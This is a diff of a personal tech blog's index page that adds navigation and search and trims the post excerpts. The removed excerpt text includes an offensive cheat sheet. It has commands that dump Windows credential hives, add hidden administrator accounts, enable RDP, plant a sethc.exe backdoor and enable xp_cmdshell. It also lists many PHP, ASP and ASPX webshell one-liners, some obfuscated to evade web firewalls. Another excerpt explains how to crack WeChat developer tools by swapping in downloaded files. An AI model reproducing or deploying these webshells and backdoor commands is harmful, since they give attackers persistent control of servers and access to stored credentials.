@@ -6,6 +6,8 @@
   <title>Ivan&#39;s Blog | Thinking as a Geek</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
+  <meta name="theme-color" content="#2196f3">
+  
   
   <meta name="keywords" content="undefined">
   <meta name="description" content="Thinking as a Geek">
@@ -18,8 +20,10 @@
 <meta name="twitter:title" content="Ivan's Blog">
 <meta name="twitter:description" content="Thinking as a Geek">
   
+    <link rel="alternative" href="/atom.xml" title="Ivan&#39;s Blog" type="application/atom+xml">
+  
   <meta name="summary" content="Thinking as a Geek">
-  <link rel="shortcut icon" href="/">
+  <link rel="shortcut icon" href="/favicon.ico">
   <link rel="stylesheet" href="/css/style.css">
 </head>
 
@@ -33,7 +37,7 @@
   </a>
   <div class="brand-wrap">
     <div class="brand">
-      <a href="/" class="avatar"><img src="undefined"></a>
+      <a href="/" class="avatar"><img src="/img/logo.jpg"></a>
       <hgroup class="introduce">
         <h5 class="nickname">Ivan</h5>
       </hgroup>
@@ -41,6 +45,48 @@
   </div>
   <div class="scroll-wrap flex-col">
     <ul class="nav">
+      
+          <li class="waves-block waves-effect active">
+            <a href="/"  >
+              <i class="icon icon-lg icon-home"></i>
+              主页
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="/fav"  >
+              <i class="icon icon-lg icon-archives"></i>
+              收藏夹
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="/tags"  >
+              <i class="icon icon-lg icon-tags"></i>
+              分类
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="https://github.com/yfgeek" target="_blank" >
+              <i class="icon icon-lg icon-github"></i>
+              Github
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="http://www.weibo.com/yfsss" target="_blank" >
+              <i class="icon icon-lg icon-weibo"></i>
+              Weibo
+            </a>
+          </li>
+      
+          <li class="waves-block waves-effect">
+            <a href="/about" target="_blank" >
+              <i class="icon icon-lg icon-link"></i>
+              关于
+            </a>
+          </li>
       
     </ul>
 
@@ -56,6 +102,16 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">Ivan&#39;s Blog</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input " autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
         
         
     </div>
@@ -109,7 +165,7 @@
     
     
         <a href="/2016/09/26/使用ProxyChains进行终端代理/" class="post-more waves-effect waves-button">
-            
+            阅读全文...
         </a>
     </div>
     
@@ -150,49 +206,11 @@
     
            前言  这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。 
    下载  微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。 Mac版下载地址：  http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg  
- windows下载地址：  http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe  
-   破解  如果你不是内测用户，你需要破解，先下载以下文件。 
- 文件1： 
-  http://source.lattecake.com/files/2016/09/createstep.js  
- 文件2： 
-  http://source.lattecake.com/files/2016/09/projectStores.js  
- 替换路径： 
- createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js 
- projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js 
-   尝鲜    
-   做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的： 
- 
- app.js 
- app.wxss 
- app.json 
- app.wxml 
- 
- 其中wxss文件类似于css，所有css语法均支持 js是APP() json文件是层级设置，页面的形态 wxml文件更像是xml和html的混合版 
-   
- IDE并不强大，但是是用HTML写的，有点类似于VS CODE。 
-   优点  
-  HTML5是未来，腾讯帮助整个生态系统往前走了一大步。  
- 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。 
- 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。 
- 开发简单，入门门槛低。 
- 
-   缺点  
- 不支持引用js，比如jquery等众多优秀的js插件。 
- 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。 
- 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。 
- 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。 
- 
-   总结  我想用一句名言总结一下前端趋势及未来App趋势： 
- 
- Any application that can be written in JavaScript, will eventually be written in JavaScript. 
- 
- 腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。 
- 不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。 
-
+ windows下载地址：  http://source.l
     
     
         <a href="/2016/09/25/微信小程序的一些感想/" class="post-more waves-effect waves-button">
-            
+            阅读全文...
         </a>
     </div>
     
@@ -233,18 +251,11 @@
     
            简介  树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器 
    为什么不用pptp vpn  这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。 
-   一键配置脚本       1  2  3  4      wget http://mirrors.linuxeye.com/oneinstack.tar.gz  tar xzf oneinstack.tar.gz  cd oneinstack  ./shadowsocks.sh install      
- 漫长的等待结束就好了 
-   慢慢配置    安装Pip       1      apt-get install python-pip python-gevent python-m2crypto      
-   安装Shadowsocks       1      pip install shadowsocks      
-   创建Shadowsocks配置文件  配置文件  /etc/shadowsocks.json  内容如下：       1  2  3  4  5  6  7  8  9  10  11      &#123;      &quot;server&quot;:&quot;0.0.0.0&quot;,      &quot;server_port&quot;:8388,      &quot;local_address&quot;: &quot;127.0.0.1&quot;,      &quot;local_port&quot;:1080,      &quot;password&quot;:&quot;密码&quot;,      &quot;timeout&quot;:300,      &quot;method&quot;:&quot;aes-256-cfb&quot;,      &quot;fast_open&quot;: false,      &quot;workers&quot;: 1  &#125;       
-   启动服务       1      nohup ssserver -c /etc/shadowsocks.json &amp;      
-   设定为自动启动的方法  写入  nohup ssserver -c /etc/shadowsocks.json &amp;  到 /etc/rc.local 文件的 exit 之前。 
-
+   一键配置脚本       1  2  3  4      
     
     
         <a href="/2016/09/13/ss-server/" class="post-more waves-effect waves-button">
-            
+            阅读全文...
         </a>
     </div>
     
@@ -290,22 +301,11 @@
  安装HEXO 
  配置Github 
  
-   搬家    第一步  Ghost导出数据json：实验室-导出，下载好json 
-   第二步  安装搬家工具       1      npm i hexo-migrator-ghost --save       
-   第三步  修改 ./scaffolds/post.md 文件内容为： 
-      1  2  3  4      title: &#123;&#123; title &#125;&#125;    date: &#123;&#123; date &#125;&#125;    tags: &#123;&#123; tags &#125;&#125;    ---      
-   第四步  将json文件放到根目录，并且执行： 
-      1  2      hexo migrate ghost source.json    hexo clean ; hexo d -g      
-   注意  经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的： 
- 
- HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的 
- tag可能会出问题，会自动加–，请自行删除，或者批量删除 
- 
-
+   搬家    第一步  Gho
     
     
         <a href="/2016/09/12/GHOST搬迁到HEXO-Github-Pages-指南/" class="post-more waves-effect waves-button">
-            
+            阅读全文...
         </a>
     </div>
     
@@ -349,48 +349,11 @@
   http://www.wghostk.com/so/  
   http://p.08lt.com  
   http://www.144118.com/  
-   国际   https://haveibeenpwned.com/  
-  https://leakbase.pw/  
-   C段   http://www.144118.com/  
-   whois查询   http://whois.domaintools.com/  
-   历史页面    那些实用命令    reg导出sam  reg save hklm\sam sam.hive 
- reg save hklm\system system.hive 
- reg save hklm\security security.hive 
-   Windows新建用户  net user admin$ admin /add 
- net localgroup administrators admin$ /add 
- net user Guest 1234 
- net user Guest /active:yes 
- net localgroup administrators Guest /add 
-   打开3389(2003,xp)  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 
-   sethc后门  Copy C:\windows\explorer.exe C:\Windows\System32\sethc.exe /y 
-   mssql xpcmdshell报错  EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE; 
-   那些一句话    asp一句话木马       1      &lt;%eval request(&quot;x&quot;)%&gt;      
-   php一句话木马       1      &lt;?php eval($_POST[g]);?&gt;      
-   aspx一句话       1      &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;      
-   数据库加密一句话(密码a)       1      ┼攠數畣整爠煥敵瑳∨≡┩愾      
-   网站配置、版权信息专用一句话       1      &quot;%&gt;&lt;%Eval Request(x)%&gt;      
-   一句话再过护卫神       1      &lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;      
-   过拦截一句话木马       1      &lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;      
-   asp闭合型一句话       1      %&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%      
-   能过安全狗的解析格式       1      ;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg      
-   突破安全狗的一句话       1      &lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;      
-   elong过安全狗的php一句话       1      &lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;      
-   后台常用写入php一句话（密码x）       1  2  3  4  5      &lt;?    $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;);    @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\r\n\r\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\r\n\r\n?&quot;.&quot;&gt;\r\n&quot;);    @fclose($fp);    ?&gt;      
-   高强度php一句话       1      &lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;      
-   新型变异PHP一句话(密码b4dboy)       1      ($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);      
-   突破安全狗的aspx一句话       1  2      &lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;  &lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;      
-   突破护卫神，保护盾一句话       1  2      &lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);  $a($_POST[&quot;test&quot;]); ?&gt;      
-   PHP高强度一句话：       1      &lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;      
- 菜刀连接： /x.php?x=lostwolf   脚本类型：php  密码：c       1      &lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;       
-   aspx过狗       1      &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;      
-   那些神器  
- Sqlmap 
- 
-
+   国际   https://
     
     
         <a href="/2016/09/11/hacktool/" class="post-more waves-effect waves-button">
-            
+            阅读全文...
         </a>
     </div>
     
@@ -419,6 +382,26 @@
 
 <script src="/js/main.js"></script>
 
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<script type="text/template" id="search-tpl">
+<li class="item">
+    <a href="/{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</script>
+
+<script src="/js/search.js"></script>
 
 
 
